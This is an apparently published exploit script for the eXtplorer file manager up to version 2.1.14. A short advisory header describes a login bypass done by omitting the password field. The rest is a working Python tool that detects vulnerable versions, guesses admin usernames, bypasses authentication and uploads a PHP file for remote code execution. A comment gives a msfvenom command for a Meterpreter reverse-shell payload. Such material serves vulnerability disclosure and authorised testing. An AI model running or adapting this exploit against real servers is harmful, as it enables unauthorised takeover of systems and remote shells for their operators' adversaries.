# Exploit Title: eXtplorer<= 2.1.14 - Authentication Bypass & Remote Code Execution (RCE)
# Exploit Author: ErPaciocco
# Author Website: https://erpaciocco.github.io
# Vendor Homepage: https://extplorer.net/
#
#   Vendor:
#   ==============
#   extplorer.net
#
#   Product:
#   ==================
#   eXtplorer <= v2.1.14
#
#   eXtplorer is a PHP and Javascript-based File Manager, it allows to browse
#   directories, edit, copy, move, delete,
#   search, upload and download files, create & extract archives, create new
#   files and directories, change file
#   permissions (chmod) and more. It is often used as FTP extension for popular
#   applications like Joomla.
#
#   Vulnerability Type:
#   ======================
#   Authentication Bypass (& Remote Command Execution)
#
#
#   Vulnerability Details:
#   =====================
#
#   eXtplorer authentication mechanism allows an attacker
#   to login into the Admin Panel without knowing the password
#   of the victim, but only its username. This vector is exploited
#   by not supplying password in POST request.
#
#
#   Tested on Windows
#
#
#   Reproduction steps:
#   ==================
#
#   1) Navigate to Login Panel
#   2) Intercept authentication POST request to /index.php
#   3) Remove 'password' field
#   4) Send it and enjoy!
#
#
#   Exploit code(s):
#   ===============
#
#   Run below PY script from CLI...
#
#   [eXtplorer_auth_bypass.py]
#

#   Proof Of Concept

import sys
import time
import urllib.parse
import re
import random
import string
import base64

try:
    import requests
except ImportError:
    print("ERROR: RUN: pip install requests")
    sys.exit(1)

TARGET = None
WORDLIST = None

_BUILTIN_WL = [
    'root',
    'admin',
    'test',
    'guest',
    'info',
    'adm',
    'user',
    'administrator'
    ]

_HOST = None
_PATH = None
_SESSION = None
_HEADERS = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
             'Accept-Language': 'it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3',
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive' }

def detect():
    global _HOST
    global _PATH
    global _SESSION
    global _HEADERS

    if not TARGET or len(TARGET) == 0:
        return False
        
    try:
        url_parts = TARGET[0].split('/')
        if len(url_parts) < 3:
            return False
            
        _HOST = url_parts[0] + '//' + url_parts[2]
        _PATH = '/'.join(url_parts[3:]).rstrip('/')
        
        _SESSION = requests.Session()

        raw = _SESSION.get(f"{_HOST}/{_PATH}/extplorer.xml", headers=_HEADERS, verify=False, timeout=10)

        if raw.status_code == 200:
            # Fixed escape sequences
            ver = re.findall(r"<version>(((\d+)\.?)+)</version>", raw.text, re.MULTILINE)

            if ver and len(ver) > 0 and len(ver[0]) > 2:
                if int(ver[0][2]) < 15:
                    return True

        return False
    except Exception as e:
        error(f"Detection failed: {str(e)}")
        return False


def auth_bypass():
    global _HOST
    global _PATH
    global _SESSION
    global _HEADERS
    global WORDLIST
    global _BUILTIN_WL

    _HEADERS['X-Requested-With'] = 'XMLHttpRequest'

    if WORDLIST is not None:
        if WORDLIST == _BUILTIN_WL:
            info("Attempting to guess an username from builtin wordlist")
            wl = _BUILTIN_WL
        else:
            info(f"Attempting to guess an username from wordlist: {WORDLIST}")
            try:
                with open(WORDLIST, "r") as f:
                    wl = [line.strip() for line in f.readlines() if line.strip()]
            except Exception as e:
                error(f"Failed to read wordlist: {str(e)}")
                return False
                
        for user in wl:
            params = {'option': 'com_extplorer',
                      'action': 'login',
                      'type': 'extplorer',
                      'username': user,
                      'lang':'english'}

            info(f"Trying with {user}")

            try:
                res = _SESSION.post(f"{_HOST}/{_PATH}/index.php", data=params, headers=_HEADERS, verify=False, timeout=10)
                if "successful" in res.text:
                    return user
            except Exception as e:
                error(f"Request failed for user {user}: {str(e)}")
                continue
    else:
        params = {'option': 'com_extplorer',
                  'action': 'login',
                  'type': 'extplorer',
                  'username': 'admin',
                  'lang':'english'}

        try:
            res = _SESSION.post(f"{_HOST}/{_PATH}/index.php", data=params, headers=_HEADERS, verify=False, timeout=10)
            if "successful" in res.text:
                return 'admin'
        except Exception as e:
            error(f"Request failed: {str(e)}")

    return False

def rce():
    global _HOST
    global _PATH
    global _SESSION
    global _HEADERS

    try:
        tokenReq = _SESSION.get(f"{_HOST}/{_PATH}/index.php?option=com_extplorer&action=include_javascript&file=functions.js", 
                               headers=_HEADERS, verify=False, timeout=10)
        # Fixed escape sequence
        token = re.findall(r"token:\s\"([a-f0-9]{32})\"", tokenReq.text)
        
        if not token:
            error("Could not extract CSRF token")
            return False
            
        token = token[0]
        info(f"CSRF Token obtained: {token}")

        payload = editPayload()
        info("Payload edited to fit local parameters")

        params = {'option': 'com_extplorer',
                  'action': 'upload',
                  'dir': f"./{_PATH}" if _PATH else "./",
                  'requestType': 'xmlhttprequest',
                  'confirm':'true',
                  'token': token}
                  
        name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        files = {'userfile[0]': (f"{name}.php", payload)}

        req = _SESSION.post(f"{_HOST}/{_PATH}/index.php", data=params, files=files, verify=False, timeout=10)

        if "successful" in req.text:
            info(f"File {name}.php uploaded in root dir")
            info(f"Now set a (metasploit) listener and go to: {_HOST}/{_PATH}/{name}.php")
            return True
        else:
            error("File upload failed")
            return False
            
    except Exception as e:
        error(f"RCE failed: {str(e)}")
        return False

def attack():
    if not TARGET:
        error("TARGET needed. Use -t option to specify target URL.")
        return

    info(f"Testing target: {TARGET[0]}")
    
    if not detect():
        error("eXtplorer vulnerable instance not found!")
        return
    else:
        info("eXtplorer endpoint is vulnerable!")
        username = auth_bypass()
        if username:
            info(f"Auth bypassed with username: {username}")
            rce()
        else:
            error("Authentication bypass failed")

def error(message):
    print(f"[E] {message}")

def info(message):
    print(f"[I] {message}")

def editPayload():
    # You can generate payload with msfvenom and paste below base64 encoded result
    # msfvenom -p php/meterpreter_reverse_tcp LHOST=<yourIP> LPORT=<yourPORT> -f base64
    return base64.b64decode("PD9waHAgZWNobyAiSEFDS0VEISI7ICA/Pg==")

def help():
    print(r"""eXtplorer <= 2.1.14 exploit - Authentication Bypass & Remote Code Execution

Usage:
  python3 eXtplorer_auth_bypass.py -t <target-host> [-w <userlist>] [-wb]

Options:
  -t    Target host. Provide target URL (e.g., http://target.com:8080/path)
  -w    Wordlist for user enumeration and authentication (Optional)
  -wb   Use built-in wordlist for user enumeration (Optional)
  -h    Show this help menu.

Examples:
  python3 eXtplorer_auth_bypass.py -t https://target.com
  python3 eXtplorer_auth_bypass.py -t http://target.com:1234 -w wordlist.txt
  python3 eXtplorer_auth_bypass.py -t http://target.com -wb
""")
    return True

def main():
    global TARGET
    global WORDLIST
    
    if len(sys.argv) < 2:
        help()
        sys.exit(1)
    
    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        
        if arg == '-t' and i + 1 < len(sys.argv):
            TARGET = [sys.argv[i + 1]]
            i += 2
        elif arg == '-w' and i + 1 < len(sys.argv):
            WORDLIST = sys.argv[i + 1]
            i += 2
        elif arg == '-wb':
            WORDLIST = _BUILTIN_WL
            i += 1
        elif arg == '-h':
            help()
            sys.exit(0)
        else:
            error(f"Unknown argument: {arg}")
            help()
            sys.exit(1)
    
    if not TARGET:
        error("Target URL is required. Use -t option.")
        help()
        sys.exit(1)
    
    attack()

if __name__ == "__main__":
    main()
